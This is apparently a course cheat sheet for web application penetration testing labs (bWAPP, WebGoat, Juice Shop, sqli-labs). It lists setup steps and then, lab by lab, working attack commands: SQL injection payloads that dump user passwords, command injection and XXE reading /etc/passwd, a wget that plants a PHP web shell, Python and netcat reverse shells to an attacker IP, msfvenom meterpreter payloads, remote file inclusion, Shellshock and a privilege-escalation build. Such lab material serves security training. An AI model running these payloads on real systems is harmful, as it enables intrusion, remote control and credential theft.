Lab 2 Commands: SQLi Labs Setup
===============================================================
> cp -r sqli-labs-php7-master /var/www/html
> service mysql start

> mysql -u root -p
> use mysql;
> GRANT ALL PRIVILEGES ON *.* TO 'jesse'@'localhost' IDENTIFIED BY 'password';

> service mysql restart
> cd /var/www/html/sqli-labs-php7-master/sql-connections
> vi db-creds.inc
> service mysql restart
> service apache2 start
> vim /etc/mysql/mariadb.conf.d/50-server.cnf
> service mysql restart

Lab 2 URLs:
------------------------------------------
https://github.com/skyblueee/sqli-labs-php7
http://localhost/sqli-labs-php7-master/Less-1/?id=1


Lab 3 Commands: WebGoat 8 Setup
=================================================================
> java -jar webgoat-server-<<version>>.jar --server.port=9090

Lab 3 URLs:
-------------------------------------------
https://github.com/WebGoat/WebGoat/releases
http://localhost:9090/WebGoat


Lab 4 Commands: OWASP Juice Shop Setup
=================================================================
> curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
> echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list
> apt-get remove docker docker-engine docker.io
> apt-get install docker-ce
> docker run hello-world
> docker pull bkimminich/juice-shop
> docker run --rm -p 3000:3000 bkimminich/juice-shop

Lab 4 URLs:
------------------------------
http://localhost:3000


Lab 5 Commands: bWAPP Setup
=================================================================
> .\ovftool.exe "C:\Users\Jesse\Videos\Web App Pentesting\Lab 5 - bWAPP Setup\Virtual Machine\bee-box\bee-box.vmx" " C:\Users\Jesse\Videos\Web App Pentesting\Lab 5 - bWAPP Setup\Virtual Machine\bee-box\beebox.ovf"

Lab 5 URLs:
-------------------------------
https://sourceforge.net/projects/bwapp/files/bee-box/
https://drive.google.com/drive/folders/1yx-OvNAnG4JF7uZU8xHhYVVLHdgI7Dzm?usp=sharing
http://(BEEBOX IP ADDRESS)/bWAPP


Lab 6 Commands: OWASP A1-Injection
=================================================================
> sqlmap -u "http://altoromutual.com/bank/login.aspx" --data="uid=admin&passw=pass&btnSubmit=Login" -p uid

> jesse' or '1'='1 
> 101 or 1=1

Lab 6 URLs:
----------------------------------------
http://altoromutual.com/bank/login.aspx


Lab 7 Commands: OWASP A1 - Injection
=================================================================
> ?id=1' or 1=1 --+
> ?id=1' ORDER by 4 -- +

> mysql -u jesse -p
> use mysql;
> use security;
> SELECT * FROM users WHERE id='1' UNION SELECT 1,2,3;

Web Inputs:
--------------------------------------
> ?id=99999' UNION SELECT 1,2,3 --+
> ?id=99999' UNION SELECT 1,version(),database() --+
> ?id=99999' UNION SELECT 1,user(),@@datadir --+
> ?id=-1' UNION SELECT * FROM users WHERE id='-1' union SELECT 1, group_concat(DISTINCT table_schema SEPARATOR ', '),3 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' --+

> ?id=-1' UNION SELECT * FROM users WHERE id='-1' union SELECT 1, group_concat(DISTINCT column_name SEPARATOR ', '),3 FROM information_schema.columns WHERE table_schema='security' --+

> ?id=-1' union select 1,group_concat(username SEPARATOR ', '), group_concat(password SEPARATOR ', ') from users --+


Lab 8 Commands: OWASP A1 - Injection
================================================================
> ?id=1
> ?id=1' AND 1=1 --+
> ?id=1' AND 1=2 --+

> mysql -u jesse -p
> use security;
> select database();
> select length(database());
> select substr(database(),1,1);
> select ascii(substr(database(),1,1));
> ?id=1' AND (ascii(substr((select database()),1,1))) = ascii --+
> select sleep(5);
> select if((select ascii(substr((select database()),1,1))) = 115, sleep(5), null);
> ?id=1' AND if((select ascii(substr((select database()),1,1))) = 115, sleep(5), null) --+

Lab 8 URLs:
---------------------------------------------
http://localhost/sqli-labs-php7-master/Less-8/


Lab 9 Commands: OWASP A1 - Injection
===============================================================
> phpinfo()
> ?message=1;system('cat /proc/version');
> ?message=test;system('grep -A 5 1001 /etc/passwd');  
> ?message=test;system('hostname');
> ?message=test;system('whoami');
> ?message=test;system('pwd');

<!--#exec cmd="hostname" -->
<!--#exec cmd="pwd" -->

> cp /usr/share/webshells/php/php-backdoor.php /var/www/html/php-backdoor.php.txt
> service apache2 start

<!--#exec cmd="wget http://192.168.112.4/php-backdoor.php.txt -O /var/www/bWAPP/shellz.php" -->

> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.112.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

> python -c 'import pty; pty.spawn("/bin/bash")'

Lab 9 URLs:
-------------------------------------------
http://(BEEBOX IP ADDRESS)/bWAPP
http://(KALI LINUX IP ADDRESS)/shellz.php


Lab 10 Commands: OWASP A2 - Broken Auth and Session Mgmt.
===============================================================
> tcpdump -nnttttAi eth1


Lab 11 Commands: OWASP A3 - Sensitive Data Exposure
===============================================================
> apt-get install ftp
> ftp (BEEBOX IP ADDRESS)
> anonymous

> tcpdump -nnttttAi eth1 port 20 or port 21
> nmap -p8443 --script ssl-poodle.nse (BEEBOX IP ADDRESS)

> msfconsole
> use auxiliary/scanner/ssl/openssl_heartbleed
> set RPORT 8443
> set RHOSTS 192.168.112.5
> set VERBOSE true
> run


Lab 12 Commands: OWASP A4 - Xml External Entities (XXE)
================================================================
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment>
<text>AAAAA&xxe;</text>
</comment>

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [<!ENTITY bWAPP SYSTEM "file:///etc/passwd">
]> 

<reset><login>&bWAPP;</login><secret>bar</secret></reset>


Lab 13 Commands: OWASP A5 - Broken Access Controls (IDOR)
================================================================
> WebGoat/profile/2342384

PUT /WebGoat/IDOR/profile/2342388 HTTP/1.1
Host: localhost:8080
Referer: http://localhost:8080/WebGoat/start.mvc
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
X-HTTP-Method-Override: POST
Cookie: JSESSIONID=39726650BD8229CE454E1B5F177CF883
Connection: close
Content-Length: 120

{
	"role" : 1,
 	"color" : "red",
	"size" : "small",
        "name" : "Buffalo Bill",
        "userId" : "2342388"
}


Lab 14 Commands: OWASP A5 - Broken Access Controls (IDOR)
===============================================================
> dirb http://192.168.112.5/ -f
> msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.112.4 LPORT=4446 -f raw -o /var/www/html/evil.txt

> msfconsole 
> use exploit/multi/handler
> set LPORT 4446
> set LHOST 192.168.112.4
> set PAYLOAD php/meterpreter_reverse_tcp
> run

> ?language=http://192.168.112.4/evil.txt

> python -c 'import pty; pty.spawn("/bin/sh")'
> id
> whoami


Lab 15 Commands: OWASP A6 - Security Misconfigurations
===============================================================
> ftp 192.168.112.5
> anonynmous

> msfconsole
> use exploit/multi/handler
> set LHOST 192.168.112.4
> set LPORT 4446
> set PAYLOAD php/meterpreter_reverse_tcp
> run

> bWAPP/rlfi.php?language=http://192.168.112.4/evil.txt

> python -c 'import pty; pty.spawn("/bin/sh")'

> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.112.4 LPORT=5000 -f elf -o /var/www/html/run
> mv shell.elf /var/www/html
> service apache2 start

> wget http://192.168.112.4/run -o /tmp/run
> mv shell.elf /tmp/run
> gcc cve-2009-1185.c -o /tmp/privescalation


Lab 16 Commands: OWASP A6 - Security Misconfigurations
===============================================================
> dirb http://192.168.112.5 | grep -i webdav
> nikto -h http://192.168.112.5/webdav/
> cadaver http://192.168.112.5/webdav/
> mget *
> msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.112.4 LPORT=4446 -f raw -o evil.txt
> put evil.txt

> msfconsole
> use exploit/multi/handler
> set LHOST 192.168.112.4
> set LPORT 4446
> set PAYLOAD php/meterpreter_reverse_tcp
> exploit

> move evil.txt evil.php

> msfconsole
> use auxiliary/scanner/snmp/snmp_enum
> set RHOSTS 192.168.112.5

Lab 16 URLs:
------------------------------------------
http://(BEEBOX IP ADDRESS)/webdav/evil.txt
http://(BEEBOX IP ADDRESS)/webdav/evil.php


Lab 17 Commands: OWASP A7 - Cross Site Scripting (XSS)
===============================================================
> javascript:alert(document.cookie);

<script>alert('my javascript here')</script>

> start.mvc#test/

# Use Encoding:{ / = %2F }
> http://localhost:9090/WebGoat/start.mvc#test/<script>alert('DOM XSS works')</script>
> http://localhost:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome();</script>

<script>webgoat.customjs.phoneHome()</script>


Lab 18 Commands: OWASP A7 - Cross Site Scripting (XSS)
===============================================================

<script>alert('Vulnerable to XSS')</script>

> "}]}';</script><script>alert('Vulnerable to XSS')</script> 
<svg onload=alert(1)>
<img src=# onerror=alert(1)>
Referer: ';alert('Reflected XSS');'
bWAPP: <script>alert('Reflected XSS')</script>


Lab 19 Commands: OWASP A7 - Cross Site Scripting (XSS)
===============================================================

<script>alert('Stored XSS')</script>
> main.php?redirect=<script>alert('SQlite=vulnerable')</script>


Lab 20 Commands: OWASP A8 - Insecure Deserialization
===============================================================
> java -jar <javafile>
> sh run.sh
> python jexboss.py -u http://localhost:8080

Lab 20 URLs:
-------------------------------------
https://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.0.4.GA/jboss-4.0.4.GA-Patch1-installer.jar/download
https://github.com/joaomatosf/jexboss


Lab 21 Commands: OWASP A9 - Components w/ known vulnerabilities
===============================================================
> Referer: () { bWAPP;}; echo; /bin/echo "Vulnerable to Shell Shock"
> Referer: () { bWAPP;}; echo; /bin/nc -e /bin/bash 192.168.112.4 5050

> $(nc -e /bin/bash 192.168.112.4 4447)
> nmap -p1-1024 192.168.112.5 -T5
> msfvenom LHOST=192.168.112.4 LPORT=4448 -p linux/x86/meterpreter/reverse_tcp -b '\x00' -f py

> msfconsole 
> use exploit/multi/handler
> set LHOST 192.168.112.5
> set LPORT 4448
> set PAYLOAD linux/x86/meterpreter/reverse_tcp
> exploit
> python sploitbee.py

Lab 21 URLs:
----------------------------------------
https://github.com/jessekurrus/Sploitbee


Lab 22 Commands: OWASP Juice Shop
================================================================
> dirb http://localhost:3000
> nikto -h http://localhost:3000

<script>alert('Vulnerable')</script> 

> sqlmap -r juiceshopsql --dbms="sqlite" --ignore-code=401 --level=5 --threads=10 --dump
> sqlmap -r juiceshopsql --dbms="sqlite" --ignore-code=401 --level=5 --threads=10 -D SQlite_masterdb -T users --dump
